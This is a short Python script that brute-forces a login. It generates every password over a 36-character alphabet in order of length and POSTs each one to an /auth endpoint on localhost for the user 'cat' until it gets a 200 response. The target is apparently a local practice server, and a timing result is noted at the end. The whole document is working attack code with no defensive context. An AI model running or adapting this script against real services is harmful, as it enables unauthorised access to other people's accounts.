# 0 -> '00'
# 1 -> '01'
# 2 -> '02'
# ...
# 10 -> '0q'
# 11 -> '0w'
# ...
# 35 -> '0m'
# 36 -> '10'
# 37 -> '11'
# ...
# 36 ** 2 - 1 -> 'mm'

import requests

alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'

length = 0
state = 0
base = len(alphabet)

while True:

    password = ''
    temp_state = state
    while temp_state > 0:
        ceil = temp_state // base
        rest = temp_state % base
        password = alphabet[rest] + password
        temp_state = ceil

    password = alphabet[0] * (length - len(password)) + password

    print(state, password)
    response = requests.post('http://127.0.0.1:4000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('Success!', 'cat', password)
        break

    state += 1
    if password == alphabet[-1] * length:
        length += 1
        state = 0


# python password_generator.py  52.37s user 6.03s system 56% cpu 1:42.89 total
